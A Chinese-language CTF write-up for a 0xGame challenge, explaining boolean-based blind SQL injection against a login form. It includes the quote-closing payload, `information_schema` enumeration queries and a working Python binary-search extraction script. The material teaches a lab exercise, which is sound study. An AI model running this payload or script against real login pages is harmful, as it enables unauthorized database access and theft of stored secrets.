# week4Gie gie,come to inject me

## 题目简述

登录接口存在基于响应内容的布尔盲注。数据库连接没有选择默认库，`database()` 无法直接给出业务库名，因此需要先从 `information_schema` 枚举 schema、表和列，再使用全限定名读取 `test.0xgame_secret` 中的 `secret`。

## 解题过程

用户名位于双引号字符串中，可以用双引号闭合，并通过 `#` 注释后续密码条件。先比较一个恒真和恒假条件，确认响应中是否包含 `l0v3` 可以作为布尔判据。

由于当前连接没有执行 `USE <database>`，直接查询 `database()` 得不到目标库。按以下顺序枚举元数据：

```sql
select group_concat(schema_name) from information_schema.schemata
select group_concat(table_name) from information_schema.tables where table_schema='test'
select group_concat(column_name) from information_schema.columns where table_schema='test' and table_name='0xgame_secret'
```

结果依次确认业务库 `test`、表 `0xgame_secret` 和列 `secret`。下面的脚本以字符 ASCII 值做二分搜索，并在越过字符串末尾时以 `0` 终止：

```python
import requests

target = "http://challenge/login.php"

def oracle(condition):
    payload = f'" OR ({condition})#'
    response = requests.post(
        target,
        data={"username": payload, "password": "2333"},
        timeout=5,
    )
    return "l0v3" in response.text

def extract(expression):
    result = []
    position = 1

    while True:
        low, high = 0, 127
        while low < high:
            middle = (low + high + 1) // 2
            condition = (
                f"ASCII(SUBSTR(({expression}),{position},1))>={middle}"
            )
            if oracle(condition):
                low = middle
            else:
                high = middle - 1

        if low == 0:
            return "".join(result)

        result.append(chr(low))
        position += 1
        print("".join(result))

secret = extract("SELECT secret FROM test.0xgame_secret LIMIT 1,1")
print(secret)
```

脚本输出的 `secret` 即为提交所需内容。原 WP 中写死的比赛 IP 和端口只属于当时环境，复现时应替换为当前题目地址。

## 方法总结

本题的关键点有两个：建立稳定的真假响应判据，以及在没有默认数据库时使用 `information_schema` 和全限定表名。二分盲注把每个字符的请求量从线性枚举降低到约 $\log_2 128=7$ 次，但仍应设置超时、重试和终止条件，避免网络抖动造成错误字符。
